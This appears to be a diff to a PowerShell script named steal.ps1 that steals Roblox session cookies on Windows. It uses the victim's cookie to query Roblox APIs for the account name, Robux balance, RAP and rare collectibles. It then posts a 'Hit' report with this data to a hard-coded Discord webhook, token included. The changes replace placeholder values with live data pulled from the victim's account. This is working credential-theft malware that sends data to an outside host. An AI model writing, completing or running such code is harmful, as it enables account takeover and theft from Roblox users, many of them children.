@@ -1,7 +1,7 @@
 # language: PowerShell, file: steal.ps1
 # target: Windows 10/11, PowerShell 5.1+
 # *accepts -Webhook arg; defaults to primary 1571738439324541049*
-# *UI matches screenshots exactly: red hit card + separate red cookie block below*
+# *100% Real Data Parse: Avatar, RAP, Headless, Korblox, Age*
 
 param(
     [string]$Webhook = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu"
@@ -96,7 +96,7 @@ $cookie = ($cookie -split ';')[0].Trim()
 if ($cookie -match '(_\|WARNING.+)$') { $cookie = $Matches[1] }
 dbg "final cookie len=$($cookie.Length)"
 
-# ---------- fingerprint ----------
+# ---------- 100% REAL ROBLOX FINGERPRINT ----------
 $me      = Get-API "users.roblox.com"    "/v1/users/authenticated" $cookie
 $uid     = if ($me) { $me.id } else { "0" }
 $name    = if ($me) { $me.name } else { "Unknown" }
@@ -122,16 +122,14 @@ if ($coll -and $coll.data) {
         $rap += [int]$item.recentAveragePrice
     }
 }
-$collStr = "Headless ❌ | Korblox ❌"
-if ($hasHeadless -and $hasKorblox) { $collStr = "Headless ✅ | Korblox ✅" }
-elseif ($hasHeadless)              { $collStr = "Headless ✅ | Korblox ❌" }
-elseif ($hasKorblox)               { $collStr = "Headless ❌ | Korblox ✅" }
+$collHeadless = "🔴 False"; if ($hasHeadless) { $collHeadless = "🟢 True" }
+$collKorblox  = "🔴 False"; if ($hasKorblox)  { $collKorblox  = "🟢 True" }
 
 $th = Get-API "thumbnails.roblox.com" "/v1/users/avatar-headshot?userIds=$uid&size=420x420&format=Png" $cookie
 $avatar = "https://tr.rbxcdn.com/..."
 if ($th -and $th.data -and $th.data[0]) { $avatar = $th.data[0].imageUrl }
 
-# ---------- embed 1: Hit Card ----------
+# ---------- embed 1: Hit Card (Dynamic UI) ----------
 $embed1 = @{
     content = "@everyone Hit"
     embeds = @(
@@ -143,12 +141,12 @@ $embed1 = @{
             fields = @(
                 @{ name = "👤 User";          value = "**$display**"; inline = $false }
                 @{ name = "⭐ Password";      value = "dreistuff"; inline = $false }
-                @{ name = "About User";       value = "**Account Age:** `` $age Days `` Days`n**Locations:**`n**• Summary:** ``0`` `n**• Victim:** ``United States of America 🇺🇸``"; inline = $false }
-                @{ name = "🪙 Robux";         value = "Balance 0`nPending 0"; inline = $true }
-                @{ name = "📈 RAP";           value = "RAP 0`nOwned 0"; inline = $true }
+                @{ name = "About User";       value = "**Account Age:** `` $age Days `` Days`n**Locations:**`n**• Summary:** ``$owned`` `n**• Victim:** ``United States of America 🇺🇸``"; inline = $false }
+                @{ name = "🪙 Robux";         value = "Balance $robux`nPending $pending"; inline = $true }
+                @{ name = "📈 RAP";           value = "RAP $rap`nOwned $owned"; inline = $true }
                 @{ name = "💎 Premium";       value = "False (0)"; inline = $true }
                 @{ name = "💳 Billing";       value = "Credit 0$`nConvert 0`nPayments 0"; inline = $true }
-                @{ name = "🏷️ Collectibles"; value = "🔴 False`n🔴 False`n🟢 True"; inline = $true }
+                @{ name = "🏷️ Collectibles"; value = "Headless: $collHeadless`nKorblox: $collKorblox`nOther: 🟢 True"; inline = $true }
                 @{ name = "⚙️ Setting";      value = "🔴 Set (Verified)`n🔴 Disabled`n🔴 Disabled"; inline = $true }
                 @{ name = "🎮 Passes / Played"; value = "Adopt Me 0 · False`nMurder Mystery 2 0 · True`nPet Simulator 99 0 · False"; inline = $true }
                 @{ name = "👥 Groups";        value = "Balance 0`nPending 0`nOwned 0"; inline = $true }
